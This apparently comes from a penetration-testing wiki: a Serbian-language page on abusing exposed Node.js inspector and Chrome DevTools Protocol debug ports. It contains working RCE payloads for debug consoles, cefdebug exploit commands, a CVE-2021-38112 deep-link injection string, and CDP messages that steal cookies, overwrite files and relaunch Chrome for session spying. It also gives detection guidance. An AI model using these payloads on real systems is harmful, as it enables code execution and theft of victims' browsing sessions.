# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

Istorijski praktični primeri obuhvataju Multimaster walkthrough i napad na Visual Studio Code debugger CVE-2019-1414; koristite ih kao kontekst specifičan za verziju, umesto pretpostavke da svaki aktuelni Electron ili Chromium target izlaže iste primitive.<sup>[[1]](#references)[[3]](#references)</sup>

## Osnovne informacije

[Prema dokumentaciji](https://nodejs.org/learn/getting-started/debugging): Kada se pokrene sa prekidačem `--inspect`, Node.js proces osluškuje debugging klijent. **Podrazumevano**, osluškivaće na hostu i portu **`127.0.0.1:9229`**. Svakom procesu se takođe dodeljuje **jedinstveni** **UUID**.<sup>[[4]](#references)</sup>

Inspector klijenti moraju znati i navesti adresu hosta, port i UUID da bi se povezali. Puna URL adresa izgleda ovako: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.<sup>[[4]](#references)</sup>

> [!WARNING]
> Pošto **debugger ima potpun pristup Node.js execution environment-u**, malicious actor koji može da se poveže na ovaj port možda može da izvrši arbitrary code u ime Node.js procesa (**potential privilege escalation**).<sup>[[4]](#references)</sup>

Postoji nekoliko načina za pokretanje inspector-a:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
Kada pokrenete proces koji se ispituje, pojaviće se nešto poput ovoga:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Procesi zasnovani na **CEF** (**Chromium Embedded Framework**) mogu izložiti debugger sa `--remote-debugging-port=9222`. Ovo izlaže browser kroz [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) umesto Node.js inspectora, tako da Node.js payload-i zasnovani na `process` po podrazumevanim podešavanjima nisu direktno primenljivi.<sup>[[2]](#references)[[5]](#references)</sup>

Kada pokrenete browser sa uključenim debugging-om, pojaviće se nešto poput sledećeg:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumerisanje i upravljanje CDP endpointom

HTTP discovery endpoints razlikuju **browser** WebSocket od pojedinačnih **target** (kartica, worker, extension itd.) WebSocket veza. Za browser endpoint koristite upit `/json/version`, a za targete `/json/list`; vraćene vrednosti `webSocketDebuggerUrl` zatim se mogu direktno koristiti sa CDP porukama nalik JSON-RPC porukama.<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
Na primer, povežite se pomoću `websocat "$BROWSER_WS"` i pošaljite `{"id":1,"method":"Target.getTargets"}` ili `{"id":2,"method":"Storage.getCookies"}`. Na page target-u (`websocat "$PAGE_WS"`), `Runtime.evaluate` se izvršava u tom renderer-u, a `Page.captureScreenshot` vraća screenshot kodiran u base64 formatu. `document.cookie` ne može da otkrije `HttpOnly` cookies, dok `Storage.getCookies` od browser-a zahteva njegov cookie store.<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Browsers, WebSockets i same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Websites otvoreni u web-browseru mogu da šalju WebSocket i HTTP zahteve u okviru browser security modela. **Početna HTTP konekcija** je neophodna za **dobijanje jedinstvenog ID-ja debugger sesije**. **Same-origin-policy** **sprečava** websites da uspostave **ovu HTTP konekciju**. Kao dodatnu zaštitu od [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** Node.js proverava da **'Host' headers** za konekciju navode ili **IP adresu** ili tačno **`localhost`**.<sup>[[4]](#references)</sup>

> [!TIP]
> Ova **security mera sprečava exploitovanje inspectora** za pokretanje koda **samo slanjem HTTP zahteva** (što bi moglo da se uradi exploitovanjem SSRF vuln-a).<sup>[[4]](#references)</sup>

### Pokretanje inspectora u procesima koji su u radu

Možete poslati **signal SIGUSR1** aktivnom nodejs procesu kako biste ga naterali da **pokrene inspector** na podrazumevanom portu. Međutim, imajte na umu da morate imati dovoljne privilegije, tako da ovo može omogućiti **privileged access informacijama unutar procesa**, ali ne i direktnu eskalaciju privilegija.<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> Ovo je korisno u containerima zato što **gašenje procesa i pokretanje novog** sa `--inspect` **nije opcija**, jer će **container** biti **ugašen** zajedno sa procesom.<sup>[[6]](#references)</sup>

### Povezivanje sa inspector/debuggerom

Da biste se povezali sa **Chromium-based browserom**, mogu se pristupiti URL-ovima `chrome://inspect` ili `edge://inspect` za Chrome odnosno Edge. Klikom na dugme Configure treba proveriti da li su **ciljni host i port** ispravno navedeni. Slika prikazuje primer Remote Code Execution (RCE):<sup>[[2]](#references)[[4]](#references)</sup>

![Nakon pristupanja URL-u pojaviće se debugger. npr. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Povezivanje sa inspector/debuggerom: Da biste se povezali sa Chromium-based browserom,...](<../../images/image (674).png>)

Pomoću **command line-a** možete se povezati sa debuggerom/inspectorom koristeći:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Alat [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) omogućava **pronalaženje inspectora** koji rade lokalno i **ubacivanje koda** u njih.<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> Imajte na umu da **NodeJS RCE exploit-i neće raditi** ako ste povezani sa browserom putem [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (potrebno je da proverite API kako biste pronašli zanimljive načine za njegovu upotrebu).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE u NodeJS Debugger/Inspectoru

> [!TIP]
> Ako ste ovde došli tražeći način da dobijete [**RCE putem XSS-a u Electronu, pogledajte ovu stranicu.**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

Neki uobičajeni načini za dobijanje **RCE-a** kada možete da se **povežete** sa Node **inspectorom** jesu korišćenje nečega poput sledećeg (izgleda da ovo **neće raditi pri povezivanju sa Chrome DevTools protocolom**):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payload-i

API možete proveriti ovde: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
U ovom odeljku ću samo navesti zanimljive stvari za koje sam pronašao da su ih ljudi koristili za exploit ovog protokola.

### Ograničenje podrazumevanog profila u verziji Chrome 136+

Počevši od verzije **Chrome 136**, Chrome ignoriše `--remote-debugging-port` i `--remote-debugging-pipe` kada ciljaju **podrazumevani Chrome direktorijum sa podacima**. Ovaj switch mora biti uparen sa nestandardnim `--user-data-dir`, čiji zasebni ključ za enkripciju i izolovano stanje browsera sprečavaju da jednostavna tehnika zasnovana na flag-u izloži korisnikov uobičajeni autentifikovani profil. Ne treba pretpostaviti da ovo ograničenje specifično za Chrome obuhvata starije verzije Chrome-a, Chrome for Testing, Electron/CEF aplikacije ili druge Chromium derivate bez provere.<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Therefore, to što je trenutni Chrome proces pokrenut samo sa `--remote-debugging-port` **ne dokazuje** da je CDP postao aktivan. Potvrdite listener i `/json/version`, i utvrdite koji profil ga zapravo podržava.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

U [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) kompanija Rhino Security otkrila je da je aplikacija zasnovana na CEF-u **registrovala prilagođeni UR**I u sistemu (workspaces://index.html), koji je primao puni URI, a zatim **pokretao aplikaciju zasnovanu na CEF-u** sa konfiguracijom koja je delimično konstruisana na osnovu tog URI-ja.<sup>[[8]](#references)</sup>

Otkriveno je da su parametri URI-ja URL dekodovani i korišćeni za pokretanje osnovne CEF aplikacije, što je korisniku omogućilo da **ubaci** flag **`--gpu-launcher`** u **command line** i izvršava proizvoljne radnje.<sup>[[8]](#references)</sup>

Dakle, payload poput:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Izvršiće `calc.exe`.<sup>[[8]](#references)</sup>

### Prepisivanje datoteka

Promenite fasciklu u koju će **preuzete datoteke biti sačuvane** i preuzmite datoteku kako biste **zamenili** često korišćeni **izvorni kod** aplikacije svojim **malicioznim kodom**.<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE i exfiltration

STAR Labs je pokazao da izložene WebDriver/CDP usluge mogu omogućiti proizvoljno čitanje datoteka i RCE; DNS rebinding u nekim konfiguracijama može dovršiti exploit chain.<sup>[[9]](#references)</sup>

Za dodatne istorijske slučajeve browser automation-a i Chromium security-ja pogledajte Counter WebDriver write-up i Project Zero probleme 773, 1742 i 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Omogućavanje CDP-a unutar aktivnog Chromium procesa

Na Windows-u, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) je pokazao da ograničenje komandne linije nije jedini način za aktiviranje CDP-a: kod koji već može da izvrši injection u postojeći `msedge.exe` može pozvati Chromium-ov neeksportovani `content::DevToolsAgentHost::StartRemoteDebuggingServer` i izložiti autentifikovani aktivni profil bez ponovnog pokretanja browser-a.<sup>[[15]](#references)</sup>

Prikazani chain ubacuje DLL pomoću `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, razrešava interne Edge simbole (prvo iz PDB-ova, a zatim pomoću byte signatures specifičnih za verziju), subclass-uje browser window i šalje poruku tako da se završni poziv za pokretanje servera izvrši na browser **UI thread-u**. Socket je vezan za loopback, nakon čega uobičajeni CDP primitives mogu da preuzmu cookies, snime tabove, pregledaju network traffic ili izvrše JavaScript na autentifikovanim stranicama.<sup>[[15]](#references)</sup>

> [!WARNING]
> Ovo je **post-compromise/process-injection** tehnika, a ne neautentifikovani network bypass. Veoma zavisi od build-a jer relevantni C++ simboli nisu eksportovani, a signatures se mogu promeniti nakon browser update-a.<sup>[[15]](#references)</sup>

Za detekciju se nemojte oslanjati samo na telemetriju komandne linije `--remote-debugging-*`: takođe korelišite neuobičajene handles i memorijske operacije nad browser procesima (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, kreiranje thread-ova), DLL injection i neočekivane loopback listening sockets u vlasništvu Chrome-a/Edge-a.<sup>[[15]](#references)</sup>

### Post-Exploitation

U realnom okruženju i **nakon kompromitovanja** korisničkog računara koji koristi browser zasnovan na Chromium-u, istorijska tehnika je bila ponovno pokretanje browser-a sa omogućenim debugging-om i prosleđivanje loopback porta. Ovo može izložiti browsing state žrtve na proizvodima/build-ovima koji i dalje prihvataju izabrani profil, ali Chrome 136+ ovo neće prihvatiti za svoj podrazumevani data directory.<sup>[[7]](#references)[[14]](#references)</sup>

Originalna komanda za ponovno pokretanje sačuvana je ispod za starije targete/specifične verzije. Druga komanda je podržani oblik za aktuelni Chrome, ali kreira izolovani profil umesto ponovnog otvaranja žrtvinog uobičajenog autentifikovanog state-a.<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
Za macOS-specifični Chromium relaunch, extension i CDP tradecraft, pogledajte [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - alat za inspekciju i eksploataciju CEF/Chromium debugger-a](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Remote Code Execution u Visual Studio Code-u putem Chrome DevTools Debugger-a](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Vodič za debugging Node.js-a - Početak rada](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Zloupotreba Chrome debugging funkcije za daljinsko posmatranje i kontrolu browsing sesija](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - WebDriver RCE putem DNS Rebinding-a i CDP-a (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Od bot-a do RCE-a](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Izmene prekidača za remote debugging radi poboljšanja bezbednosti - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Injecting CDP into a Running Edge Browser: Detaljna analiza Runtime Browser Instrumentation-a](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
